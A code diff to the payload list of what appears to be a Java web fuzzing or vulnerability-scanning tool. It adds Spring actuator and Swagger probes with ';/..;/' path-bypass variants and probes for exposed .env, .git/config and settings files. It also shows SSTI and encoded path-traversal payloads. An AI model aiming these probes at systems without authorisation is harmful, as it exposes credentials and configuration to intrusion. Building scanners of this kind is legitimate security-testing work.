@@ -26,7 +26,6 @@ public class PayloadConstants {
      * 8K固定字符串用于随机测试
      */
     public static final String FIXED_8K_STRING = FixedStrings.FIXED_8K_STRING;
-
     /**
      * Header模糊测试专用的payload列表
      */
@@ -53,8 +52,6 @@ public class PayloadConstants {
             new PayloadInfo("${9188*8}", "SSTI2"),
             new PayloadInfo("#{9188*8}", "SSTI3"),
             new PayloadInfo("[[${9188*8}]]", "SSTI4")
-
-
     );
 
     /**
@@ -127,13 +124,6 @@ public class PayloadConstants {
             new PayloadInfo("{param}//..//..//..//..//..//..//..//..", "{param}//..X8"),
             new PayloadInfo("{param}%2f%2f..%2f%2f..%2f%2f..%2f%2f..%2f%2f..%2f%2f..%2f%2f..%2f%2f..", "{param}%2f%2f..X8"),
             new PayloadInfo("{param}/..;/..;/..;/..;/..;/..;/..;/..;", "{param}/..;X8")
-
-
-            // JSON字符串特有（不适用于GET、POST）
-
-
-
-
     );
 
     /**
@@ -194,34 +184,140 @@ public class PayloadConstants {
             new PayloadInfo("{path}/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E", "{path}/%2E%2EX8"),
             new PayloadInfo("{path}%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E", "{path}%2F%2E%2EX8"),
             new PayloadInfo("{path}//..//..//..//..//..//..//..//..", "{path}//..X8"),
-            new PayloadInfo("{path}%2f%2f..%2f%2f..%2f%2f..%2f%2f..%2f%2f..%2f%2f..%2f%2f..%2f%2f..", "{path}%2f%2f..X8")
+            new PayloadInfo("{path}%2f%2f..%2f%2f..%2f%2f..%2f%2f..%2f%2f..%2f%2f..%2f%2f..%2f%2f..", "{path}%2f%2f..X8"),
 
+            // --- 新增 Spring 类路径 Payload ---
+            new PayloadInfo("swagger", "swagger"),
+            new PayloadInfo("swagger-resources", "swagger2"),
+            new PayloadInfo("api_docs", "api_docs"),
+            new PayloadInfo("v2/api-docs", "v2docs"),
+            new PayloadInfo("v3/api-docs", "v3docs"),
+            new PayloadInfo("actuator", "actuator"),
+            new PayloadInfo("env", "env"),
+            new PayloadInfo("health", "health"),
+            new PayloadInfo("mappings", "mappings"),
+            new PayloadInfo("gateway", "gateway"),
+            new PayloadInfo("metrics", "metrics"),
+            new PayloadInfo("jolokia", "jolokia"),
+            new PayloadInfo(";/swagger;.js", ";/swagger;.js"),
+            new PayloadInfo(";/swagger-resources;.js", ";/swagger2;.js"),
+            new PayloadInfo(";/api_docs;.js", ";/api_docs;.js"),
+            new PayloadInfo(";/v2/api-docs;.js", ";/v2/api-docs;.js"),
+            new PayloadInfo(";/v3/api-docs;.js", ";/v3/api-docs;.js"),
+            new PayloadInfo(";/actuator;.js", ";/actuator;.js"),
+            new PayloadInfo(";/env;.js", ";/env;.js"),
+            new PayloadInfo(";/health;.js", ";/health;.js"),
+            new PayloadInfo(";/mappings;.js", ";/mappings;.js"),
+            new PayloadInfo(";/gateway;.js", ";/gateway;.js"),
+            new PayloadInfo(";/metrics;.js", ";/metrics;.js"),
+            new PayloadInfo(";/jolokia;.js", ";/jolokia;.js"),
+            new PayloadInfo(";/..;/swagger", ";/..;/swagger"),
+            new PayloadInfo(";/..;/swagger-resources", ";/..;/swagger2"),
+            new PayloadInfo(";/..;/api_docs", ";/..;/api_docs"),
+            new PayloadInfo(";/..;/v2/api-docs", ";/..;/v2/api-docs"),
+            new PayloadInfo(";/..;/v3/api-docs", ";/..;/v3/api-docs"),
+            new PayloadInfo(";/..;/actuator", ";/..;/actuator"),
+            new PayloadInfo(";/..;/env", ";/..;/env"),
+            new PayloadInfo(";/..;/health", ";/..;/health"),
+            new PayloadInfo(";/..;/mappings", ";/..;/mappings"),
+            new PayloadInfo(";/..;/gateway", ";/..;/gateway"),
+            new PayloadInfo(";/..;/metrics", ";/..;/metrics"),
+            new PayloadInfo(";/..;/jolokia", ";/..;/jolokia"),
+            new PayloadInfo(";/..;/..;/swagger", ";/..;/X2-swagger"),
+            new PayloadInfo(";/..;/..;/swagger-resources", ";/..;/X2-swagger2"),
+            new PayloadInfo(";/..;/..;/api_docs", ";/..;/..;/api_docs"),
+            new PayloadInfo(";/..;/..;/v2/api-docs", ";/..;/..;/v2/api-docs"),
+            new PayloadInfo(";/..;/..;/v3/api-docs", ";/..;/..;/v3/api-docs"),
+            new PayloadInfo(";/..;/..;/actuator", ";/..;/..;/actuator"),
+            new PayloadInfo(";/..;/..;/env", ";/..;/..;/env"),
+            new PayloadInfo(";/..;/..;/health", ";/..;/..;/health"),
+            new PayloadInfo(";/..;/..;/mappings", ";/..;/..;/mappings"),
+            new PayloadInfo(";/..;/..;/gateway", ";/..;/..;/gateway"),
+            new PayloadInfo(";/..;/..;/metrics", ";/..;/..;/metrics"),
+            new PayloadInfo(";/..;/..;/jolokia", ";/..;/..;/jolokia"),
+            new PayloadInfo(";/..;/..;/..;/swagger", ";/..;/X3-swagger"),
+            new PayloadInfo(";/..;/..;/..;/swagger-resources", ";/..;/X3-swagger2"),
+            new PayloadInfo(";/..;/..;/..;/api_docs", ";/..;/..;/..;/api_docs"),
+            new PayloadInfo(";/..;/..;/..;/v2/api-docs", ";/..;/..;/..;/v2/api-docs"),
+            new PayloadInfo(";/..;/..;/..;/v3/api-docs", ";/..;/..;/..;/v3/api-docs"),
+            new PayloadInfo(";/..;/..;/..;/actuator", ";/..;/..;/..;/actuator"),
+            new PayloadInfo(";/..;/..;/..;/env", ";/..;/..;/..;/env"),
+            new PayloadInfo(";/..;/..;/..;/health", ";/..;/..;/..;/health"),
+            new PayloadInfo(";/..;/..;/..;/mappings", ";/..;/..;/..;/mappings"),
+            new PayloadInfo(";/..;/..;/..;/gateway", ";/..;/..;/..;/gateway"),
+            new PayloadInfo(";/..;/..;/..;/metrics", ";/..;/..;/..;/metrics"),
+            new PayloadInfo(";/..;/..;/..;/jolokia", ";/..;/..;/..;/jolokia"),
 
-//            new PayloadInfo("{path}/../{path}", "{path}/../{path}"),
-//            new PayloadInfo("{path}/", "{path}/"),
-//            new PayloadInfo("{path}%2f", "{path}%2f"),
-//            new PayloadInfo("{path}/..;", "{path}/..;"),
-//            new PayloadInfo("{path}/..;/..;/..;/..;/..;", "{path}/..;/X5"),
-//            new PayloadInfo("{path}/../", "{path}/../"),
-//            new PayloadInfo("{path}/../../../../../../../", "{path}/..X7"),
-//            new PayloadInfo("{path}%2f..%2f..%2f..%2f..%2f..%2f..%2f..", "{path}%2f..X8"),
-//            new PayloadInfo("{path}\\", "{path}\\"),
-//            new PayloadInfo("{path}\\..\\..\\", "{path}\\..\\..\\"),
-//            new PayloadInfo("{path}%5c..%5c", "{path}%5c..%5c"),
-//            new PayloadInfo("{path}%5c..%5c..%5c..%5c..%5c..%5c", "{path}%5c..X5"),
-//            new PayloadInfo("{path}/..%2f", "{path}/..%2f"),
-//            new PayloadInfo("{path}/..%2f..%2f..%2f..%2f..%2f..%2f..", "{path}/..%2fX6"),
-//            new PayloadInfo("{path}/..%5c", "{path}/..%5c"),
-//            new PayloadInfo("{path}/..%5c..%5c..%5c..%5c..%5c..%5c..", "{path}/..%5cX6"),
-//            new PayloadInfo("{path}/..//..//..//..//..//..//..//..//..//etc//shells", "{path}/..//X9/etc"),
-//            new PayloadInfo("{path}/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshells", "{path}/..%2FX10/etc"),
-//            new PayloadInfo("{path}/../../../../../../../../etc/shells", "{path}/../X8/etc"),
-//            new PayloadInfo("{path}/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/shells", "{path}/%5c..X10/etc"),
-//            new PayloadInfo("{path}/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/shells", "{path}/..%252fX8/etc"),
-//            new PayloadInfo("{path}/\\..\\..\\...\\..\\..\\..\\..\\..\\..\\etc\\shells", "{path}/\\..X10/etc"),
-//            new PayloadInfo("{path}/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/etc/shells", "{path}/%2E%2E/X8/etc"),
-//            new PayloadInfo("{path}/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2F%2E%2F%2F%2E%2F%2F%2E%2F%2Fetc%2Fshells", "{path}/%2E%2FXX3/etc"),
-//            new PayloadInfo("file:///etc/shells", "file protocol")
+            // --- 新增 Spring 类 URL Rewrite Payload ---
+            new PayloadInfo("swagger", "swagger-rewrite"),
+            new PayloadInfo("swagger-resources", "swagger2-rewrite"),
+            new PayloadInfo("api_docs", "api_docs-rewrite"),
+            new PayloadInfo("v2/api-docs", "v2docs-rewrite"),
+            new PayloadInfo("v3/api-docs", "v3docs-rewrite"),
+            new PayloadInfo("actuator", "actuator-rewrite"),
+            new PayloadInfo("env", "env-rewrite"),
+            new PayloadInfo("health", "health-rewrite"),
+            new PayloadInfo("mappings", "mappings-rewrite"),
+            new PayloadInfo("gateway", "gateway-rewrite"),
+            new PayloadInfo("metrics", "metrics-rewrite"),
+            new PayloadInfo("jolokia", "jolokia-rewrite"),
+
+            // --- 新增 通用框架信息泄露探测 Payload ---
+            new PayloadInfo(".env", ".env"),
+            new PayloadInfo(".env.local", ".env.local"),
+            new PayloadInfo(".env.prod", ".env.prod"),
+            new PayloadInfo("appsettings.json", "appsettings.json"),
+            new PayloadInfo(".git/", ".git/"),
+            new PayloadInfo(".git/config", ".git/config"),
+            new PayloadInfo(".DS_Store", ".DS_Store"),
+            new PayloadInfo(".svn/entries", ".svn/entries"),
+            new PayloadInfo(".svn/", ".svn/"),
+            new PayloadInfo("wc.db", "wc.db"),
+            new PayloadInfo("manager//..;/", "manager//..;/"),
+            new PayloadInfo("settings.py", "settings.py"),
+            new PayloadInfo("admin_dev.php", "admin_dev.php"),
+            new PayloadInfo("index_dev.php", "index_dev.php"),
+            new PayloadInfo("app_dev.php", "app_dev.php"),
+            new PayloadInfo("_fragment", "_fragment"),
+            new PayloadInfo("_profiler", "_profiler"),
+
+            // --- 新增 {sub../} 特殊逻辑 Payload ---
+            new PayloadInfo("{sub../}.env", "{sub../}.env"),
+            new PayloadInfo("{sub../}.env.local", "{sub../}.env.local"),
+            new PayloadInfo("{sub../}.env.prod", "{sub../}.env.prod"),
+            new PayloadInfo("{sub../}appsettings.json", "{sub../}appsettings.json"),
+            new PayloadInfo("{sub../}.git/", "{sub../}.git/"),
+            new PayloadInfo("{sub../}.git/config", "{sub../}.git/config"),
+            new PayloadInfo("{sub../}.DS_Store", "{sub../}.DS_Store"),
+            new PayloadInfo("{sub../}.svn/entries", "{sub../}.svn/entries"),
+            new PayloadInfo("{sub../}.svn/", "{sub../}.svn/"),
+            new PayloadInfo("{sub../}wc.db", "{sub../}wc.db"),
+            new PayloadInfo("{sub../}manager//..;/", "{sub../}manager//..;/"),
+            new PayloadInfo("{sub../}settings.py", "{sub../}settings.py"),
+            new PayloadInfo("{sub../}admin_dev.php", "{sub../}admin_dev.php"),
+            new PayloadInfo("{sub../}index_dev.php", "{sub../}index_dev.php"),
+            new PayloadInfo("{sub../}app_dev.php", "{sub../}app_dev.php"),
+            new PayloadInfo("{sub../}_fragment", "{sub../}_fragment"),
+            new PayloadInfo("{sub../}_profiler", "{sub../}_profiler"),
+
+            // --- 新增 通用框架信息泄露探测 URL Rewrite Payload ---
+            new PayloadInfo(".env", ".env-rewrite"),
+            new PayloadInfo(".env.local", ".env.local-rewrite"),
+            new PayloadInfo(".env.prod", ".env.prod-rewrite"),
+            new PayloadInfo("appsettings.json", "appsettings.json-rewrite"),
+            new PayloadInfo(".git/", ".git/-rewrite"),
+            new PayloadInfo(".git/config", ".git/config-rewrite"),
+            new PayloadInfo(".DS_Store", ".DS_Store-rewrite"),
+            new PayloadInfo(".svn/entries", ".svn/entries-rewrite"),
+            new PayloadInfo(".svn/", ".svn/-rewrite"),
+            new PayloadInfo("wc.db", "wc.db-rewrite"),
+            new PayloadInfo("manager//..;/", "manager//..;/-rewrite"),
+            new PayloadInfo("settings.py", "settings.py-rewrite"),
+            new PayloadInfo("admin_dev.php", "admin_dev.php-rewrite"),
+            new PayloadInfo("index_dev.php", "index_dev.php-rewrite"),
+            new PayloadInfo("app_dev.php", "app_dev.php-rewrite"),
+            new PayloadInfo("_fragment", "_fragment-rewrite"),
+            new PayloadInfo("_profiler", "_profiler-rewrite")
     );
 
     /**
@@ -231,7 +327,6 @@ public class PayloadConstants {
         private static final ThreadLocal<Random> RANDOM = ThreadLocal.withInitial(Random::new);
         private static final String HASH_CHARS = "0123456789abcdefghijklmnopqrstuvwxyz";
         private static final int HASH_LENGTH = 5;
-
         /**
          * 生成随机hash字符串用于{fuzz}替换
          */
@@ -266,7 +361,6 @@ public class PayloadConstants {
          */
         public static String processCommonReplacements(String payload, String paramValue) {
             String processed = payload;
-
             // 处理 8000 字符随机字符串
             if ("{random_8000}".equals(payload)) {
                 return FIXED_8K_STRING;
